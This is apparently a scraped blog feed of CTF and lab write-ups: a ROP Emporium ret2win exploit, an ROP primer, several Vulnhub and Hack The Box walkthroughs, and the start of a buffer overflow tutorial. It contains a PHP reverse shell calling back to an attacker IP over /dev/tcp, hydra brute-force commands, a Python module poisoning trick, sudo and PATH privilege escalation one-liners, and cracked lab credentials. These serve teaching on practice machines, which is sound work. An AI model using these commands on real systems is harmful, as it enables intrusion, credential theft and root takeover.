(\u0026lt;_start\u0026gt;:\txor ebp,ebp) R13: 0x7fffffffdf20 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400809 \u0026lt;pwnme+84\u0026gt;:\tcall 0x400620 \u0026lt;fgets@plt\u0026gt; 0x40080e \u0026lt;pwnme+89\u0026gt;:\tnop 0x40080f \u0026lt;pwnme+90\u0026gt;:\tleave =\u0026gt; 0x400810 \u0026lt;pwnme+91\u0026gt;:\tret 0x400811 \u0026lt;ret2win\u0026gt;:\tpush rbp 0x400812 \u0026lt;ret2win+1\u0026gt;:\tmov rbp,rsp 0x400815 \u0026lt;ret2win+4\u0026gt;:\tmov edi,0x4009e0 0x40081a \u0026lt;ret2win+9\u0026gt;:\tmov eax,0x0 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffde38 (\u0026#34;AA0AAFAAb\u0026#34;) 0008| 0x7fffffffde40 --\u0026gt; 0x400062 --\u0026gt; 0x1f8000000000000 0016| 0x7fffffffde48 --\u0026gt; 0x7ffff7a05b97 (\u0026lt;__libc_start_main+231\u0026gt;:\tmov edi,eax) 0024| 0x7fffffffde50 --\u0026gt; 0x1 0032| 0x7fffffffde58 --\u0026gt; 0x7fffffffdf28 --\u0026gt; 0x7fffffffe2b4 (\u0026#34;/home/robin/ROP-Emporium/ret2win\u0026#34;) 0040| 0x7fffffffde60 --\u0026gt; 0x100008000 0048| 0x7fffffffde68 --\u0026gt; 0x400746 (\u0026lt;main\u0026gt;:\tpush rbp) 0056| 0x7fffffffde70 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000400810 in pwnme () In 64-bit binaries we can see the RIP doesn\u0026rsquo;t contain our sequence. In 64-bit, it will not pop a value into RIP if it cannot actually jump to the address and execute it. So the value is at top of the stack after popping to RIP failed. So from above we can see that RSP has the pattern, we can get value from it. As we can see it has a value of \u0026ldquo;AA0AAFAAb\u0026rdquo; at the time of segment fault.\nTime to find the padding we need in order to execute the instruction properly. Using peda:-\ngdb-peda$ pattern_offset AA0AAFAAb AA0AAFAAb found at offset: 40 Creating Exploit #Now, we have all we need to execute the exploit. Now let\u0026rsquo;s craft the exploit. We need the memory address of RIP and the padding length and python, of course.\nUsing pwntools to craft exploit:-\nfrom pwn import * # Importing all functions from pwntools prog = process(\u0026#34;./ret2win\u0026#34;) # Opening ret2win library payload = \u0026#34;A\u0026#34; * 40 # padding payload += p64(0x00400824) # Address of \u0026#34;push rbp\u0026#34; from sym.pwnme open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) # Writing the payload to fie payload. Now, run the exploit:-\nrobin@oracle:~/ROP-Emporium$ python ret2win.py [+] Starting local process \u0026#39;./ret2win\u0026#39;: pid 9089 [*] Stopped process \u0026#39;./ret2win\u0026#39; (pid 9089) robin@oracle:~/ROP-Emporium$ ./ret2win \u0026lt; payload ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don\u0026#39;t worry about null bytes, we\u0026#39;re using fgets! \u0026gt; ROPE{a_placeholder_32byte_flag!} Bam, we read the flag by pushing the pop rbp address to RIP hence executing our payload.\nFollow me on twitter for more ROP contents.\n","date":"26 July 2019","permalink":"/posts/rop-tools-usage/","section":"Posts","summary":"This blog post will teach you basics of ROP i.e. how to use tools efficiently.\nOverview #This post is more practical, so tag along with radare2, pwntools, gdb and ropper ready.","title":"ROP- Basic Exploit Creation"},{"content":"","date":null,"permalink":"/tags/rop-pwn-radare2-pwntools/","section":"Tags","summary":"","title":"Rop, Pwn, Radare2, Pwntools"},{"content":"This blog post will let you know about the ROP or Return Oriented Programming.\nWhat is ROP? #Return Oriented Programming is a modern method of exploiting a binary that will allow us to take control of the stack and the abuse program\u0026rsquo;s control flow by the help of gadgets. Often times, this technique is used to exploit a binary which takes input without bound checking that will result in overflow of the memory in which the input is being stored resulting in segmentation fault. This method is only used when we have handful of gadgets i.e. instruction sequences ending with \u0026ldquo;ret\u0026rdquo; or byte \u0026ldquo;c3\u0026rdquo;.\nPrerequisities #Since, this method of exploitation is based on analyzation of functions and memory address which requires some basic reverse engineering and understanding of assembly language.\nSo, for reverse engineering you can refer to following resources in order to learn ROP.\nReverse Engineering with radare2 Reverse Engineering with gdb As of now, I\u0026rsquo;ve only included radare2 and gdb which is going to be used for this series.\nFor Assembly, you can refer the follwoings:-\nAssembly Language Guide 1 Assembly Language Guide 2 Tools #This can be a little long because the more the merrier.\nFirst off, we need something to analyze the binary.\nRadare2 #If you\u0026rsquo;ve ever tried binary analysis and reverse enginnering you must have come across radare2, which is a great binary analysis CLI tool and it has a built-in gadget finder.\nGDB-PEDA #This is Python Exploit Development Assitance plugin for GDB which can be found here.\nPwntools #This is absolutely a great python library which will help you with execution of your exploit by providing helpful functions, which can be get from here.\nRopper #This is also a great tool for finding gadgets within a binary, which can be obtained from here.\nFinding Gadgets #From my experience as of now, I\u0026rsquo;ve used ropper and radare2\u0026rsquo;s built-in function /R \u0026lt; instruction \u0026gt;. With the use of these two tools you\u0026rsquo;ll have the gadgets which will help you in bypassing DEP(Data Execution Prevention) hence, executing your payload.\nUse of gadgets #So, as of now you know that in order to build a ROP chain we have to get the binary\u0026rsquo;s corresponding gadgets. Now, I\u0026rsquo;ll tell you what is the exact use of gadget is.\nLoading Constants to Register #With the help of ropper or radare2 you can find the pop instruction with a ret which can be used to store a constant into stack for further use. Let a gadget be pop edi, ret, this will pop the edi register value from the stack and return the address to top of the stack.\nSystem Call #System call i.e. int 0x80 followed by ret instruction can be used to interrupt a kernel call that we have setup using previous gadget. Following are the system call gadgets:-\nint 0x80; ret call gs:[0x10]; ret Gadget to lookout #There are some gadget which are better left alone i.e. we need to avoid these gadgets in order to avoid corruption of the stack frames.\nGadgets with pop ebp; ret will mess our stack frames. Gadgets ending in pop ebp followed by ret or have the instruction pop ebp. Will also mess up our stack frame. Sometimes these gadgets dont affect the overall execution of ROP shell. It depends on the execution flow and will it be interrupted by changing the frame pointer.\nContinuing the series #This blogpost will help you in understanding the what and why of Revserse Oriented Programming. All of the resources will help you in understanding the Assembly and a little of reverse engineering.\nNext I\u0026rsquo;ll be posting how to get build a ROP chain from binary. Until then, read out all the resoures.\n","date":"24 July 2019","permalink":"/posts/rop-introduction/","section":"Posts","summary":"This blog post will let you know about the ROP or Return Oriented Programming.\nWhat is ROP? #Return Oriented Programming is a modern method of exploiting a binary that will allow us to take control of the stack and the abuse program\u0026rsquo;s control flow by the help of gadgets.","title":"Introduction to ROP"},{"content":"","date":null,"permalink":"/tags/rop-pwn-bof/","section":"Tags","summary":"","title":"Rop, Pwn, Bof"},{"content":"Today, we are going to pwn Pumpkin Festival from Vulnhub.\nNmap #Starting off with the nmap using nmap -sV -sC -A -p- -T5 192.168.43.17 reveals that we have FTP, HTTP and SSH at 6880.\nTokens #From the first discovery I found that flag are named as token and that is our challenge i.e. finding all tokens.\nFirst #First one was at the botttom of the HTML page can be viewed upon inspection of the page.\nSecond #With the result of nmap scan we seen that anaonymous login is open. Using the package ftp we logged into the machine and in the directory named secret we found a file named token.txt having the second token.\nPumpkinToken : 2d6dbbae84d724409606eddd9dd71265\nThird #This one requires bruteforcing the FTP service in order to get token, as we have inspected HTTP client for first we saw that there is a user named harry. On the basis of that assumption, using hydra -l harry -P rockyou.txt 192.168.43.17 ftp -t 60, it will take some time so don\u0026rsquo;t get impatient.\nPassword of user harry:-\nLogging in with user harry shows that we have a token.txt and a directory named Donotopen. Get the token and start changing directories.\nPumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e\nForth #While logged in FTP, and chanaging bunch NO named nested directories, we get another token and a data.txt.\nPumpkinToken : f9c5053d01e0dfc30066476ab0f0564c\nThat data.txt was a tar file which can be confirmed using file data.txt.\nExtracting it gives a hex encoded OpenSSL Private Key.\nFifth #Checking robots.txt on a HTTP we get see a /tarck/track.txt, going to that webpage we see:-\nHey Jack!\nThanks for choosing our local store. Hope you like the services. Tracking code : 2542 8231 6783 486\n-Regards admin@pumpkins.local\nadmin@pumpkins.local seems interesting, editing the hosts file we add pumpkia.local. After this, we get a wordpress temed website. Using wpscan doesn\u0026rsquo;t give any interesting results. So, using dirb we see a lot of pages which can be seen at any normal wordpress website.\nGoing to readme.html it shows a base?? encoded data, using CyberChef and trying multiple bases we can see it\u0026rsquo;s a base64 data which decodes to credentails.\n\u003c!DOCTYPE html\u003e Semantic Personal Publishing Platform\n-- This content is removed because of security purposes -- K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s\nmorse \u0026amp; jack : Ug0t!TrIpyJ\nSo, logging into the wordpress with as morse we see that there is a flag in biographical info.\nPumpkinToken : 7139e925fd43618653e51f820bc6201b\nSixth #Now, so we had a OpenSSL private key, we can use it to get into the machine via SSH as jack with ssh -i key jack@192.168.43.17 -p 6880 we get into the system.\nIn the home directory we can see a ELF named token, running it we can get our seventh token.\nPumpkinToken : 8d66ef0055b43d80c34917ec6c75f706\nRoot #Using wordpress credentials for jack we can use sudo. Using sudo -l we can see that creating a file within /home/jack/pumpkin/alohomora we can execute any binary. From our previous encounter of privilege escalation we are going to create a binary named alohooa.\njack@pumpkin:~/pumpkins$ echo \u0026#34;/bin/sh\u0026#34; \u0026gt; alohomora jack@pumpkin:~/pumpkins$ chmod +x alohomora jack@pumpkin:~/pumpkins$ sudo ./alohomora # id uid=0(root) gid=0(root) groups=0(root) # whoami; id; cd root; cat *.txt root uid=0(root) gid=0(root) groups=0(root) Hence, checking the root directory we can see a great art of pumpkin.\nThanks #Thanks to @mzfr and Andre for helping me out.\n","date":"24 July 2019","permalink":"/posts/pumpkin-festival/","section":"Posts","summary":"Today, we are going to pwn Pumpkin Festival from Vulnhub.\nNmap #Starting off with the nmap using nmap -sV -sC -A -p- -T5 192.168.43.17 reveals that we have FTP, HTTP and SSH at 6880.","title":"Vulnhub - Pumpkin Festival"},{"content":"Today, we are going to pwn Symfonos 2 from Vulnhub.\nNmap #Starting off with Nmap, using nmap -sV -sC -A -p- -T5 192.168.43.85 shows that we have FTP, SSH, HTTP and SMB port.\nHTTP and FTP Enumeration #Going to the HTTP port shows a similar image that we encountered in previous symfonos machine. Nothing is there, running gobuster, dirb and other web crawlers gave nothing. So moving over to SMB, sice it has Backup folder which is publicly accessible, we can see a log.txt. It has following data:\nSAO, we get know thatthere is user aeolus and the directory where backup is being stored. So, as we knew FTP service is available which is ProFTP 1.3.5, searching for the exploit on ExploitDB. It has a exloit of mod_copy which allows you to copy files from one folder to another. @mzfr discovered it. We tried it and we were almost close to making it work but alas, we couldn\u0026rsquo;t. It was just a silly mistake and from this point we accidentaly did the machine in a very unintended way.\nsite cpfr /etc/passwd 350 File or directory exists, ready for destination name site cpto \u0026lt;?php phpinfo(); ?\u0026gt; 550 cpto: Permission denied site cpfr /proc/self/fd/3 350 File or directory exists, ready for destination name site cpto /var/www/test.php Note #I will explain the other method at last which @zayotic told @mzfr after completion of machine.\nFTP Bruteforce and SSH Login #Well, from this point using THC-Hydra and rockyou.txt we got the password of user aeolus. hydra -l aeolus -P rockyou.txt 192.168.43.85 ftp -t 40 reveals that the password is sergioteamo. Now, we tried it to SSH into the machine with the same creentials.\nSSH Login\nPrivilge Escalation #With some enumeration, I foud that there are 2 users aeolus and cronus. I tried it enumerate everything I can but at the it was a wild goose chase. So @mzfr told to me check /etc/apache2 folder and checking some files from that I cme to know that there is a local web server running on the machine, to confirm this I used curl which confirms it. So using socat TCP-LISTEN:5000;fork,reuseaddr 127.0.0.1:8080 we just forked te actual port i.e. 8080 to 5000 of the actual web server, now visiting to http://192.168.43.85:5000 shows that it is a LibreNMS based web application. I checked ExploitDB and it has exploit for adding a hostname that will give reverse shell, using metasploit I added the module to the ~/.ms4/exploits directory.\nAs the exploit will start working it will give a reverse shell as the user cronus. Using sudo -L we can see that mysql can be run as root. GTFOBins to the rescue.\nThat has shown that using sudo mysql '\\! /bin/sh we can spawn root shell.\nThe Flag\nIntended Way #As much as I was happy for pwning this machine but it was temporry the main learning part is missed in it by using hydra. So as I mentioned eariler we were supposed to use that ProFTP 1.3.5 vulnerbaility which can be found here to copy files from one folder to another. From that exploit we can copy the files from any folder and copy it to /home/aeolus/share/ that will make that file publicly accessible to us via SMB. So, copying the file /var/backups/shadow.bak to /home/aeolus/share/shadow.txt. After that it will be available to SMB service which can be used to dump the users password and then cracked with john to crack the hash of the user aeolus.\nResources #ProFTP 1.3.5 - File Copy: https://www.exploit-db.com/exploits/36742 GTFOBins: https://gtfobins.github.io LibreNMS Exploit: https://www.exploit-db.com/exploits/46970\nThanks to #@mzfr @DCAU7\nDetailed version og intended way. #The very detail version of the intended way is covered by @mzfr in his writeup.\n","date":"20 July 2019","permalink":"/posts/symfonos/","section":"Posts","summary":"Today, we are going to pwn Symfonos 2 from Vulnhub.\nNmap #Starting off with Nmap, using nmap -sV -sC -A -p- -T5 192.168.43.85 shows that we have FTP, SSH, HTTP and SMB port.","title":"Vulnhub - Symfonos-2"},{"content":"Today, we are going to pwn PumpkinrRaising from Vulnhub.\nNmap #Starting off with nmap and using nmap -sV -sC -A -p- -T5 192.168.43.92 shows that only 2 ports are opren 22, 80.\nSurfing on HTTP and Enumeration #So from above nmap scan we can see there is a robots.txt file with most diasllowed enteries but first off we should check off the source of the index page.\nFirst ID #Now, moving on further we can see robots.txt has a gpg file path so using curl we get it on system curl http://192.168.43.92/seeds/seed.txt.gpg \u0026gt; seeds.txt.gpg. Upon checking it it turns out to be AES-256 encrypted ciphertext, we need a key in ordwe to decrypt it. Finding the key was kind of guessy and more like connecting dots. I tried several passphrases but it fails everytime so I started checking index page again for some hint, there were3 words SEED - WATER - SUNLIGHT, so I tried SEEDWATERSUNLIGHT turns out to be the right key which gives seeds.txt which has morse code which decodes to another 5 digit ID.\nYIPPEE! YOU ARE ON THE RIGHT PATH\u0026hellip; BIGMAXPUMPKIN SEEDS ID: 69507\nSecond ID #Upon analyzing it, we can see there is a pumpkin.html so going thre didn\u0026rsquo;t give any hint so I checked source of that page which guves base32 encoded data. Decoding that data with echo -n | base32 -d gives path for a pcap file. This one was pcap forensics challenge but easy one, as we saw the pcap file in one of the disallowed enteries. Opening it in wireshark and following TCP stream we can see there is a conversation and hence we can see our third ID.\nHey Jack, Robert has given me your contact. I\u0026rsquo;m sure I have the seeds that you want Hi Mark, I\u0026rsquo;m greatful that you have the seeds Please share the seed ID so that I can get you exact seeds Sure, 50609 is the ID Thank you, I have the seeds. You\u0026rsquo;ll get your seeds in a couple of days Thank you so much Mark You\u0026rsquo;re welcome\nThird ID #Checking the source code of index page shows a route for pumpkin.html which was also a pumpkin page so checking the source again shows bunch of hex characters at the very bottom of the page which decode to:\n59 61 79 21 20 41 70 70 72 65 63 69 61 74 65 20 79 6f 75 72 20 70 61 74 69 65 6e 63 65 20 3a 29 0a 41 6c 6c 20 74 68 69 6e 67 73 20 61 72 65 20 64 69 66 66 69 63 75 6c 74 20 62 65 66 6f 72 65 20 74 68 65 79 20 62 65 63 6f 6d 65 20 65 61 73 79 2e 0a 41 63 6f 72 6e 20 50 75 6d 70 6b 69 6e 20 53 65 65 64 73 20 49 44 3a 20 39 36 34 35 34 0a 0a 44 6f 2c 20 72 65 6d 65 6d 62 65 72 20 74 6f 20 69 6e 66 6f 72 6d 20 4a 61 63 6b 20 74 6f 20 70 6c 61 6e 74 20 61 6c 6c 20 34 20 73 65 65 64 73 20 69 6e 20 74 68 65 20 73 61 6d 65 20 6f 72 64 65 72 2e\nYay! Appreciate your patience :) All things are difficult before they become easy. Acorn Pumpkin Seeds ID: 96454 Do, remember to inform Jack to plant all 4 seeds in the same order.\nFourth ID #This took sometime since we had already check all the things and I checked way too much time every single page and I started checking underconstruction.html wecan see there is a gif file so I started checking it, I was cluless here so @mzfr and he told me to use stegosuite for it. So, using stegosuite -x jackolantern.gif -k \u0026lt;password\u0026gt;, so we need a password for it as well. I tried using everything for that but nothing. So as we saw i robots.txt it has a disallowed entry for /hidden/note.txt file. Upon opening it we can see credentials combos,\nRobert : C@43r0VqG2= Mark : Qn@F5zMg4T goblin : 79675-06172-65206-17765\nI tried every password of the above users and got a success with Mark\u0026rsquo;s which gives decorative.txt which has fourth and last 5 digit ID.\nFantastic!!! looking forward for your presence in pumpkin party. Lil\u0026rsquo; Pump-Ke-Mon Pumpkin seeds ID : 86568\nSSH Login and Root Flag #So, as we got hint from last seed \u0026ldquo;it has to planteded in same order\u0026rdquo;, so that means we need to get them in correct order which is\n69507 50609 96454\n86568\nSo, using this passord which is 69507506099645486568 for user jack we looged into pumpkin machine.\nSo using sudo -l to find which binary we can use as sudo which gives that strace can be used as sudo user. Few weeks ago, I tried unknowndevices64 which had a similar type of root privilege. So, sudo strace -o /dev/null /bin/sh spawns a root shell for us and hence we can use read root flag.\nThat was it folks, we got it. It was great CTF based machine for beginners. Kudos to @mzfr for helping me out.\n","date":"17 July 2019","permalink":"/posts/pumpkin-garden/","section":"Posts","summary":"Today, we are going to pwn PumpkinrRaising from Vulnhub.\nNmap #Starting off with nmap and using nmap -sV -sC -A -p- -T5 192.168.43.92 shows that only 2 ports are opren 22, 80.","title":"Vulnhub - PumpkinRaising"},{"content":"Today, we are going to pwn Friendzone from Hack The Box.\nMethodology # Nmap scan of the machine Checking SMB service and HTTP Using dig to get subdomians Uploading PHP reverse shell Callback the reverse shell by exploiting LFI(Local File Inclusion) Getting user flag and SSH credentials Using cronjob to get root flag Nmap #Starting off with the nmap, nmap -sV -sC -A 10.10.10.123 shows so many open ports but we have to start somewhere. It includes:-\n21 - FTP 22 - SSH 53 - DNS 80 - HTTP 139 \u0026amp; 445 - SMB 443 - SSL/HTTP SMB and HTTP Enumeration #Using smbmap reveals we have access to general for read only and Development for read/write access. So, we connect to SMB by using smbclient //10.10.10.123/general/ -u root reveals we see creds.txt so we get it on our machine.\nNow, Developement seems empty so I headover to HTTP port, it was basic html page without only one useful information subdomain. We noticed it has a subdomian named friendzone.red. Running gobuster reveals nothing useful, so I moved on to DNS recon.\nDNS Enumeration and Login #Using dig axrf friendzone.red @10.10.10.123 reveals a administartor1.friendzone.red so heading over to that shows a login page, loggin with the previous obtained credentials admin:WORKWORKHhallelujah@# , tell us to redirect to dashboard.php.\nExploiting LFI vulnerability and callback Reverse Shell #This page seems told us to access url default is image_id=a.jpg\u0026amp;pagename=timestamp, seems LFI isn\u0026rsquo;t it?\nFrom previous SMB enumeration we knew that Development directory has read/write access so using php reverse shell wecan get access to friendzone machine.\nUsing folllowing code as phpinfo.php:-\n\u0026lt;?php exec(“/bin/bash -c ‘bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.156/1234 0\u0026gt;\u0026amp;1’”); phpinfo(); ?\u0026gt; we uploaded it to Development directory by\ncurl --upload-file phpinfo.php -u 'root' smb://10.10.10.123/Development/, we uploaded our shell.\nCallback #From previously found LFI, we access the our phpinfo file by https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg\u0026amp;pagename=/etc/Development/phpinfo\nNot a.jpg because it was default so no need to, so back to our listener we get a shell.\nUser Flag #Once your listener get connected to our uploaded reverse shell you can get user flag.\nGetting SSH Credentials #Checking directory and file reveals a interseting file named mysql_data.conf has following credentials:-\nfor development process this is the mysql creds for user friend\ndb_user=friend\ndb_pass=Agpyu12!0.213$\ndb_name=FZ\nSSH Login and root flag #Well, we login to ssh using previous credentials.\nAnalyzing Running Processes #There was a ELF file named pspy64, executing it shows running jobs in which we can very interesting process whuch was a python file.\nHead over /opt/server_admin/reporter.py shows a nothing more than bunch of commented out line of python code.\n#!/usr/bin/python import os to_address = “admin1@friendzone.com” from_address = “ admin2@friendzone.com” print “[+] Trying to send email to %s”%to_address #command = ‘’’ mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass “PAPAP”’’’ #os.system(command) # I need to edit the script later # Sam ~ python developer We can see a line importing python os module, since we don\u0026rsquo;t have modify permissions for reporter.py we head over /usr/bin/python2.7 we can edit os.py i.e python\u0026rsquo;s os module which has a function which allows us to execute any command by passing them as parameter.\nFor example:-\nimport os os.sytem(\u0026#39;whoami\u0026#39;) #friend So we add a single line of code at the very end of os.py\nsystem(\u0026#39;cp /root/root.txt /tmp/root1.txt\u0026#39;) # calling system functon and copying flag Hence, waiting for few minutes gives root1.txt.\nDone!!\n","date":"12 July 2019","permalink":"/posts/friendzone/","section":"Posts","summary":"Today, we are going to pwn Friendzone from Hack The Box.\nMethodology # Nmap scan of the machine Checking SMB service and HTTP Using dig to get subdomians Uploading PHP reverse shell Callback the reverse shell by exploiting LFI(Local File Inclusion) Getting user flag and SSH credentials Using cronjob to get root flag Nmap #Starting off with the nmap, nmap -sV -sC -A 10.","title":"Hack The Box - Friendzone"},{"content":"","date":null,"permalink":"/tags/nmap-ctf-hackthebox-htb/","section":"Tags","summary":"","title":"Nmap, Ctf, HacktheBox, Htb"},{"content":"Today, we are going to pwn Symfonos from Vulnhub.\nMachine Setup #Nothing much to setup in the machine, just import it to Virtualbox and choose the networking setting as per your ease, I chose the Bridge Networking as it\u0026rsquo;s easy to setup.\nMethodology # Nmap scan of the machine. Checking the SMB server for files. Checking Helios folder for important files. Discovering the WordPress website in /h3l105 route. Scanning website for the vulnerabilities via wpscan. Exloiting Mail Masta 1.0 Plugin for LFI(Local File Inclusion). Enumerating SMTP server. Using SMTP for getting a reverse shell thrrough /var/mail/helios as Helios on machine. Gaining root peivileges by exploiting /opt/statuscheck binary. Nmap #Let\u0026rsquo;s get started, using nmap -sV -sC -A 192.168.43.12 reveals HTTP, SSH, SMTP, and SMB.\nSMB service enumeration #Honestly speaking, I\u0026rsquo;ve had some problems using smbclient so I usually take the help of inbulit File application connect to server feature. So moving to File, I connectedto the server and there were two folders, first Anonymous and second Helios, Helios folder was password protected and Anonymous was avilable to everyone so I checked Anonymous folder and there was a file named as attention.txt.\nIt has following information:-\nCan users please stop using passwords like \u0026rsquo;epidioko\u0026rsquo;, \u0026lsquo;qwerty\u0026rsquo; and \u0026lsquo;baseball\u0026rsquo;! Next person I find using one of these passwords will be fired!\n-Zeus\nSo, using those password one by one for helios folder reveals folder\u0026rsquo;s files with password qwerty. It has 2 files research.txt and todo.txt.\nresearch.txt\nHelios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.\nNot relevant.\ntodo.txt\nBinge watch Dexter Dance Work on /h3l105 There /h3l105 is our focus.\nWordPress Enumeration #So, accesing to http://192.168.43.12/h3l105 reveals a wordpress website with login, post, castegories and other link.\nNote\nWhen you try to acces /wp-login.php, you\u0026rsquo;ll recieve a error so to resolve that add machine IP Address to your /etc/hosts file as symfonos.local.\nWell, it\u0026rsquo;s wordpress so wpscan to rescuse. Using wpscan --url http://symfonos.local/h3l105 --no-banner --no-update reveals two CVEs, one is SQL Injection and other LFI vulnerability both in Mail Masta Plugin 1.0.\nExploiting LFI Vulnerabilty #Here, shows LFI PoC. So implementing the PoC on http://symfonos.local/h3l105,\nVisiting http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd reveals the content of /etc/passwd.\nWe can also access /wp-config.php(this was not relevant) as well as some other files including /var/mail/helios.\nI was completely clueless so I asked @DCAU7 for hint, he told me that I need to use SMTP to progress from here.\nSMTP Enumeration and Reverse Shell via SMTP #Using telnet we can connect to SMTP and we can send data to /var/mail/helios since it\u0026rsquo;s accessible through LFI vulnerability.\ntelnet symfonos.local 25\nOnce connected we can use it to execute our php code by accessing to http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios.\nFirst let\u0026rsquo;s send a email to helios with our reverse shell\nUsing telnet we can connect to SMTP and from there we can send our reverse shell.\ntelnet symfonos.local 25\nMAIL FROM: Robin RCPT TO: helios DATA \u0026lt;PHP Reverse Shell\u0026gt; . quit Getting User and Root #So, once email will be sent we can route to http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios and that will execute our reverse shell.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null\nReveals a interesting file /opt/statuscheck, so analyzing that binary reveals that it is scraping the document info of that website. Using strings statuscheck reveals that it\u0026rsquo;s using curl i.e. curl -I http://localhost.com which basically gives the head information of a website. I tried to search for curl privilege escalation but sadly it wasn\u0026rsquo;t useful. I was stuck at this but @mzfr gave me a hint that it\u0026rsquo;s something that we have done before.\nSo, that helped me a lot. I chnaged directory to /tmp folder and ceated a binary named curl by using following commands:-\n$ echo $\u0026#34;#!/bin/sh\\n/bin/sh\u0026#34; \u0026gt; curl $ chmod 777 curl $ export PATH=:$(pwd) $ /opt/statuscheck That was it folks.\nNote #So, @mzfr gained that reverse shell in a different way than mine. So, there are two ways to gain reverse shell to the symfonos machine. Here\u0026rsquo;s his writeup.\n","date":"6 July 2019","permalink":"/posts/smfonos/","section":"Posts","summary":"Today, we are going to pwn Symfonos from Vulnhub.\nMachine Setup #Nothing much to setup in the machine, just import it to Virtualbox and choose the networking setting as per your ease, I chose the Bridge Networking as it\u0026rsquo;s easy to setup.","title":"Vulnhub - Symfonos"},{"content":"A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.\nForeword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.\nWarning: This post will be long and detailed enough, so hang in there.\nWhat is Format String Vulnerability? #At first, let\u0026rsquo;s start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-\n#include\u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { printf(argv[1]); /* No format specifier - here\u0026#39;s the vulnerability */ printf(\u0026#34;\\n\u0026#34;); return 0; } Let\u0026rsquo;s compile this:-\nrobin@oracle:/tmp$ gcc -o new new.c new.c: In function ‘main’: new.c:3:6: warning: implicit declaration of function ‘printf’ [-Wimplicit-function-declaration] printf(argv[1]); /* No format specifier */ ^~~~~~ new.c:3:6: warning: incompatible implicit declaration of built-in function ‘printf’ new.c:3:6: note: include ‘\u0026lt;stdio.h\u0026gt;’ or provide a declaration of ‘printf’ new.c:3:6: warning: format not a string literal and no format arguments [-Wformat-security] \u0026lt;--- Warning for no format specification Ah, so we got a warning(intended one), let\u0026rsquo;s run:-\nrobin@oracle:/tmp$ ./new Hello Hello \u0026lt;-- Works fine! robin@oracle:/tmp$ ./new %x d24f0e8 \u0026lt;-- Wait, what? As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you\u0026rsquo;re wondering, that hex data is an actual address from the program stack. Thus, if there\u0026rsquo;s no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.\nWhat is Buffer Overflow? #I\u0026rsquo;m sure that most of you know what it is but still let\u0026rsquo;s have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.\nConsider the following program:-\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void winner() { system(\u0026#34;/bin/bash\u0026#34;); } int main() { char buf[10]; scanf(\u0026#34;%s\u0026#34;,buf); printf(\u0026#34;Hello %s\u0026#34;,buf); return 0; } 0x000 PS: It was the only simple thing I could think of.\nSo, as you can see it takes 10 characters as input and display them. Let\u0026rsquo;s compile it and turn off the protections to make it work:\nrobin@oracle:/tmp$ sudo bash -c \u0026#39;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\u0026#39; # Turn off the ASLR(Address Space Layout Randomization) robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c # Makes Stack Executable and turn off stack smashing It\u0026rsquo;s compiled now, time to run it:-\nrobin@oracle:/tmp$ ./bof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Segmentation fault (core dumped) A Segementation Fault, we have a buffer overflow vulnerability here.\nNote: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn!\nProtections on Binaries #As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-\nBuffer overflow protection Stack overwriting protection Position independent executables (see Address space layout randomization) Binary stirring (randomizing the address of basic blocks) Pointer masking (protection against code injection) Control flow randomization (to protect against control flow diversion) Following are the protections, we will deal with:-\nStack Canaries #This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be overwritten. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.\nNon-Executable Stack #Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory. Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack 